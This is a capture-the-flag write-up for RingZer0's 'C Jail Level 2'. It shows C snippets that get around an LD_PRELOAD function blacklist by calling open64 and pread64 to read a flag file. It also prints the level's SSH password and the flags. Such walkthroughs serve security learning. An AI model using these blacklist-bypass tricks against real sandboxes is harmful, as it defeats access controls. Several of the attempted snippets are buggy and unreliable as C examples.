# Level 2

![](https://i.imgur.com/g8JCYSl.png)

```shell
ssh level2@challenges.ringzer0team.com -p 10229 
password: FLAG-ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R

RingZer0 Team Online CTF

C Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here's the default includes
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

You CANNOT use the "asm" keyword

-----------------------------
Your C code:
```

Like `Level 1`:
* `-O3` means optimize. 
* `-Wall` mean print all warning. 
* `–fstack-protector-all` add and check canary into every function. 
* `-fPIE` random the virtual memory which it reflect to.

Let's try what function is overrided.

```
Your C code:
    char buffer[1024];
    FILE *fp;
    fp = fopen("flag.txt", O_RDONLY);
    fread(buffer, 1024, 0, fp);
    printf("flag: %s\n", buffer);
    fclose(fp);
DONE
*** Warning: "fopen" function is disabled
```

```
Your C code:
    char buffer[1024];
    FILE *fp;
    fp = fopen64("flag.txt", "r");
    fread(buffer, 1024, 0, fp);
    printf("flag: %s\n", buffer);
    fclose(fp);
DONE
*** warning: implicit declaration of function
*** Warning: "malloc" function is disabled
```

```
Your C code:
    char buffer[1024];
    int fd;
    fd = fdopen("flag.txt", O_RDONLY);
    pread(fd, buffer, 1024, 0);
    printf("flag: %s\n", buffer);
DONE
*** Warning: "fdopen" function is disabled
*** Warning: "pread" function is disabled
```

```
Your C code:
    char buffer[1024];
    FILE *fp;
    fp = popen("flag.txt", 'r');
    while (fgets(buffer, 1024, fp) != NULL)
        printf("flag: %s", buffer);
    pclose(fp);    
DONE
*** Warning: "malloc" function is disabled
/home/level2/prompt.sh: line 81:  5986 Segmentation fault      LD_PRELOAD=/home/level2/override.so /tmp/$filename/bin
```

```
Your C code:
    char buffer[1024];
    int fd;
    fd = creat("flag.txt", O_RDONLY);
    pread64(fd, buffer, 1024, 0);
    printf("flag: %s\n", buffer);
    close(fd);
DONE
*** Warning: "creat" function is disabled
```

```
Your C code:
    char buffer[1024];
    int fd;
    fd = creat64("flag.txt", O_RDONLY);
    pread64(fd, buffer, 1024, 0);
    printf("flag: %s\n", buffer);
    close(fd);
DONE
*** warning: implicit declaration of function ‘creat64’ 
```

```
Your C code:
    char buffer[1024];
    int fd;
    fd = open("flag.txt", O_RDONLY);
    read(fd, buffer, 1024);
    printf("flag: %s\n", buffer);
    close(fd);
DONE
*** Warning: "open" function is disabled
*** Warning: "read" function is disabled
```

```
Your C code:
    char buffer[1024];
    int fd;
    fd = open64("flag.txt", O_RDONLY);
    pread64(fd, buffer, 1024, 0);
    printf("flag: %s\n", buffer);
    close(fd);
DONE
flag: FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
```

I just brutal force it, I still not get the solution that make sense.

`open()` and `open64()`use the open syscall internally. The main difference is that `open64()` is equivalent to `open()` with `O_LARGEFILE` in order to support large files in 32 bit applications.

```
FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
```
